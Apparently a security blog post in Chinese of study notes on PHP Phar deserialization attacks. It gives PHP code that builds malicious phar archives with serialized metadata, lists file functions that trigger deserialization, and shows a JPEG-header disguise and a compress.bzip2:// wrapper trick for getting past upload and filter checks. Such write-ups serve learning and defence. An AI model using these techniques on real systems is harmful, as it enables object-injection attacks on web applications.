@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html>
+  <head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    <title>Phar反序列化拓展攻击学习笔记 | Xiao Leung&#39;s Blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    
+      <link rel="icon" href="/favicon.png">
+    
+
+    <link rel="stylesheet" href="/css/style.css">
+
+    <link rel="stylesheet" href="/js/google-code-prettify/tomorrow-night-eighties.min.css">
+
+  </head>
+
+  <body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
+<header>
+	<a id="logo" href="/" title="Xiao Leung&#39;s Blog">
+	<img src="/favicon.png" alt="Xiao Leung&#39;s Blog"></a>
+	
+	
+		<!--搜索栏-->
+		<i class="js-toggle-search iconfont icon-search"></i>
+
+
+<form class="js-search search-form search-form--modal" method="get" action="http://gushi.li" role="search">
+	<div class="search-form__inner">
+		<div>
+			<i class="iconfont icon-search"></i>
+			<input class="text-input" placeholder="Enter Key..." type="search">
+		</div>
+	</div>
+</form>
+	
+
+	
+		<!--侧边导航栏-->
+		<a id="nav-toggle" href="#"><span></span></a>
+
+<nav>
+	<div class="menu-top-container">
+		<ul id="menu-top" class="menu">
+			
+				
+				<li class="current-menu-item">
+					<a href="https://www.plasf.cn/2019/08/01/HelloWorld/" target="_blank">AboutMe</a>
+				</li>
+			
+				
+				<li class="current-menu-item">
+					<a href="https://www.plasf.cn/HXCTF/" target="_blank">HXCTF</a>
+				</li>
+			
+		</ul>
+	</div>
+</nav>
+	
+
+</header>
+<div class="m-header ">
+	<section id="hero1" class="hero">
+		<div class="inner">
+		</div>
+	</section>
+	
+		<figure class="top-image" data-enable=true></figure>
+	
+</div>
+
+<!--文章列表-->
+<div class="wrapper">
+  
+    <!--文章-->
+<article>
+	
+  
+    <h1 class="post-title" itemprop="name">
+      Phar反序列化拓展攻击学习笔记
+    </h1>
+  
+
+	<div class='post-body mb'>
+		<h1 id="Phar反序列化拓展攻击"><a href="#Phar反序列化拓展攻击" class="headerlink" title="Phar反序列化拓展攻击"></a>Phar反序列化拓展攻击</h1><h2 id="Phar"><a href="#Phar" class="headerlink" title="Phar"></a>Phar</h2><blockquote>
+<p>Phar归档文件最有特色的特点是可以方便地将多个文件分组为一个文件。这样，phar归档文件提供了一种将完整的PHP应用程序分发到单个文件中并从该文件运行它的方法，而无需将其提取到磁盘中。此外，PHP可以像在命令行上和从Web服务器上的任何其他文件一样轻松地执行phar存档。 Phar有点像PHP应用程序的拇指驱动器。（译文）</p>
+</blockquote>
+<ul>
+<li>简单理解就是他类似zip或者说类似jar，它将PHP文件打包成一个文件然后PHP可以在不解压的情况去访问这个包里面的php，并执行。<h3 id="Phar的结构"><a href="#Phar的结构" class="headerlink" title="Phar的结构"></a>Phar的结构</h3></li>
+</ul>
+<p><strong>1.</strong> <strong>phar文件标识</strong></p>
+<pre><code class="php">&lt;?php
+Phar::mapPhar();
+include &#39;phar://phar.phar/index.php&#39;;
+__HALT_COMPILER();
+?&gt;</code></pre>
+<p>​        格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p>
+<p><strong>2. a manifest describing the contents</strong><br>         phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</p>
+<p><strong>3. the file contents</strong><br>         被压缩文件的内容。</p>
+<p><strong>4. [optional] a signature for verifying Phar integrity (phar file format only)</strong><br>         签名，放在文件末尾，格式如下：    </p>
+<h3 id="Phar的使用方法"><a href="#Phar的使用方法" class="headerlink" title="Phar的使用方法"></a>Phar的使用方法</h3><pre><code class="php">&lt;?php
+    class User{
+        var $name;
+        function __destruct(){
+            echo &quot;fangzhang&quot;;
+        }
+    }
+
+    @unlink(&quot;test.phar&quot;);
+    $phar = new Phar(&quot;test.phar&quot;);//后缀名必须为phar
+    $phar-&gt;startBuffering();
+    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);//设置stub
+    $o = new User();
+    $o-&gt;name = &quot;test&quot;;
+    $phar-&gt;setMetadata($o);//将自定义的meta-data存入manifest
+    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);//添加要压缩的文件
+    $phar-&gt;stopBuffering();
+?&gt;</code></pre>
+<p>得到的test.phar 内容如下：</p>
+<pre><code>00000000: 3c3f 7068 7020 5f5f 4841 4c54 5f43 4f4d  &lt;?php __HALT_COM
+00000010: 5049 4c45 5228 293b 203f 3e0d 0a5b 0000  PILER(); ?&gt;..[..
+00000020: 0001 0000 0011 0000 0001 0000 0000 0025  ...............%
+00000030: 0000 004f 3a34 3a22 5573 6572 223a 313a  ...O:4:&quot;User&quot;:1:
+00000040: 7b73 3a34 3a22 6e61 6d65 223b 733a 343a  {s:4:&quot;name&quot;;s:4:
+00000050: 2274 6573 7422 3b7d 0800 0000 7465 7374  &quot;test&quot;;}....test
+00000060: 2e74 7874 0400 0000 46fc 6e5d 0400 0000  .txt....F.n]....
+00000070: 0c7e 7fd8 b601 0000 0000 0000 7465 7374  .~..........test
+00000080: 9d18 4c48 ba24 6ed6 a810 3690 2aac 034e  ..LH.$n...6.*..N
+00000090: 6aee e818 0200 0000 4742 4d42            j.......GBMB</code></pre><p>可以看到，有一部分是序列化之后的内容，就是我们在上一部分所说的<code>manifest</code>也就是<code>meta-data</code></p>
+<h3 id="Phar反序列化原理"><a href="#Phar反序列化原理" class="headerlink" title="Phar反序列化原理"></a>Phar反序列化原理</h3><p>​        使用Phar://伪协议去读取Phar文件时候，文件会被当做phar对象，meta-data部分会被反序列化。</p>
+<h4 id="测试Dome"><a href="#测试Dome" class="headerlink" title="测试Dome"></a>测试Dome</h4><pre><code class="php">&lt;?php
+    class User{
+        var $name;
+        function __destruct(){
+            echo &quot;test&quot;;
+        }
+    }
+
+$file = &quot;phar://test.phar&quot;;
+@file_get_contents($file);
+?&gt;</code></pre>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="函数扩展"><a href="#函数扩展" class="headerlink" title="函数扩展"></a>函数扩展</h3><p>根据以上代码的测试可知，只要phar://协议解析文件的时候，就会造成序列化的问题，类似这样的函数不光有<code>file_get_contents</code>还有其他函数；</p>
+<p>有大牛曾经总结过，所有文件操作的函数都可以触发这种序列化：</p>
+<ul>
+<li><code>fileatime</code> / <code>filectime</code> / <code>filemtime</code></li>
+<li><code>stat</code> / <code>fileinode</code> / <code>fileowner</code> / <code>filegroup</code> / <code>fileperms</code></li>
+<li><code>file</code> / <code>file_get_contents</code> / <code>readfile</code> / `fopen``</li>
+<li><code>file_exists</code> / <code>is_dir</code> / <code>is_executable</code> / <code>is_file</code> / <code>is_link</code> / <code>is_readable</code> / <code>is_writeable</code> / <code>is_writable</code></li>
+<li><code>parse_ini_file</code></li>
+<li><code>unlink</code></li>
+<li><code>copy</code></li>
+</ul>
+<p>还有大牛深入的分析过这些函数的原理，并且加以扩展：</p>
+<ul>
+<li><code>exif_thumbnail</code></li>
+<li><code>exif_imagetype</code></li>
+<li><code>imageloadfont</code></li>
+<li><code>imagecreatefrom***</code></li>
+<li><code>hash_hmac_file</code></li>
+<li><code>hash_file</code></li>
+<li><code>hash_update_file</code></li>
+<li><code>md5_file</code></li>
+<li><code>sha1_file</code></li>
+<li><code>get_meta_tags</code></li>
+<li><code>get_headers</code></li>
+<li><code>getimagesize</code></li>
+<li><code>getimagesizefromstring</code></li>
+</ul>
+<p>几乎所有和IO有关的函数都涉及到了</p>
+<h3 id="绕过图片头检查"><a href="#绕过图片头检查" class="headerlink" title="绕过图片头检查"></a>绕过图片头检查</h3><pre><code class="php">&lt;?php
+class TestObject {}
+
+$jpeg_header_size = 
+&quot;\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01\x01\x01\x00\x48\x00\x48\x00\x00\xff\xfe\x00\x13&quot;.
+&quot;\x43\x72\x65\x61\x74\x65\x64\x20\x77\x69\x74\x68\x20\x47\x49\x4d\x50\xff\xdb\x00\x43\x00\x03\x02&quot;.
+&quot;\x02\x03\x02\x02\x03\x03\x03\x03\x04\x03\x03\x04\x05\x08\x05\x05\x04\x04\x05\x0a\x07\x07\x06\x08\x0c\x0a\x0c\x0c\x0b\x0a\x0b\x0b\x0d\x0e\x12\x10\x0d\x0e\x11\x0e\x0b\x0b\x10\x16\x10\x11\x13\x14\x15\x15&quot;.
+&quot;\x15\x0c\x0f\x17\x18\x16\x14\x18\x12\x14\x15\x14\xff\xdb\x00\x43\x01\x03\x04\x04\x05\x04\x05\x09\x05\x05\x09\x14\x0d\x0b\x0d\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14&quot;.
+&quot;\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\xff\xc2\x00\x11\x08\x00\x0a\x00\x0a\x03\x01\x11\x00\x02\x11\x01\x03\x11\x01&quot;.
+&quot;\xff\xc4\x00\x15\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xc4\x00\x14\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xda\x00\x0c\x03&quot;.
+&quot;\x01\x00\x02\x10\x03\x10\x00\x00\x01\x95\x00\x07\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x05\x02\x1f\xff\xc4\x00\x14\x11&quot;.
+&quot;\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x03\x01\x01\x3f\x01\x1f\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20&quot;.
+&quot;\xff\xda\x00\x08\x01\x02\x01\x01\x3f\x01\x1f\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x06\x3f\x02\x1f\xff\xc4\x00\x14\x10\x01&quot;.
+&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x3f\x21\x1f\xff\xda\x00\x0c\x03\x01\x00\x02\x00\x03\x00\x00\x00\x10\x92\x4f\xff\xc4\x00\x14\x11\x01\x00&quot;.
+&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x03\x01\x01\x3f\x10\x1f\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda&quot;.
+&quot;\x00\x08\x01\x02\x01\x01\x3f\x10\x1f\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x3f\x10\x1f\xff\xd9&quot;;
+
+$phar = new Phar(&quot;phar.phar&quot;);
+$phar-&gt;startBuffering();
+$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);
+$phar-&gt;setStub($jpeg_header_size.&quot; __HALT_COMPILER(); ?&gt;&quot;);
+$o = new TestObject();
+$phar-&gt;setMetadata($o);
+$phar-&gt;stopBuffering();</code></pre>
+<h3 id="限制使用phar：-出现位置"><a href="#限制使用phar：-出现位置" class="headerlink" title="限制使用phar：//出现位置"></a>限制使用phar：//出现位置</h3><pre><code class="php">$z = &#39;compress.bzip2://phar:///home/sx/test.phar/test.txt&#39;;</code></pre>
+
+	</div>
+	<div class="meta split">
+		
+			<span>本文总阅读量 <span id="busuanzi_value_page_pv"></span> 次</span>
+		
+		<time class="post-date" datetime="2019-12-12T03:31:04.000Z" itemprop="datePublished">2019-12-12</time>
+	</div>
+</article>
+
+<!--评论-->
+
+	
+<div class="ds-thread" data-thread-key="Phar反序列化拓展攻击" data-title="Phar反序列化拓展攻击学习笔记" data-url="http://www.plasf.cn/2019/12/12/Phar反序列化拓展攻击/"></div>
+<script type="text/javascript">
+
+var duoshuoQuery = {short_name:"yumemor"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0]
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+</script>
+
+
+  
+</div>
+
+
+  <svg id="bigTriangleColor" width="100%" height="40" viewBox="0 0 100 102" preserveAspectRatio="none">
+    <path d="M0 0 L50 100 L100 0 Z"></path>
+  </svg>
+
+  
+
+
+  <div class="wrapper"></div>
+
+
+
+
+
+<div class="fat-footer">
+	<div class="wrapper">
+		<div class="layout layout--center">
+			<div class="layout__item palm-mb">
+				<div class="media">
+					<img class="headimg" src='/assets/blogImg/litten.png' alt='XiaoLeung'>
+					<div class="media__body">
+						<h4>Xiaoleung&#39;s Blog</h4>
+						<p class='site-description'>Don&#39;t forget why we started</p>
+					</div>
+				</div>
+				<div class="author-contact">
+					<ul>
+						
+							
+							<li>
+				        		<a href="https://github.com/sharpleung" target="_blank">
+				        			
+				        				<i class="iconfont icon-github"></i>
+				        			
+				        		</a>
+				        	</li>
+						
+					</ul>
+				</div>
+			</div>
+		</div>
+	</div>
+</div>
+
+<footer class="footer" role="contentinfo">
+	<div class="wrapper wrapper--wide split split--responsive">
+		
+			<span>本站总访问量 <span id="busuanzi_value_site_pv"></span> 次, 访客数 <span id="busuanzi_value_site_uv"></span> 人次</span>
+		
+		<span>Theme by <a href="http://github.com/justpsvm">justpsvm</a>. Powered by <a href="http://hexo.io">Hexo</a></span>
+	</div>
+</footer>
+
+	<!-－这里导入了 lib.js 里面涵盖了 jQuery 等框架 所以注释掉-->
+	<!--<script src="http://lib.sinaapp.com/js/jquery/2.0/jquery.min.js"></script>-->
+	<script src="/js/lib.js"></script>
+	<script src="/js/google-code-prettify/prettify.js"></script>
+	<script src="/js/module.js"></script>
+	<script src="/js/script.js"></script>
+	
+		<script async src="http://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	
+	<script type='text/javascript'>
+		//代码高亮
+		$(document).ready(function(){
+	 		$('pre').addClass('prettyprint linenums').attr('style', 'overflow:auto;');
+   			prettyPrint();
+		});
+	</script>
+	<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
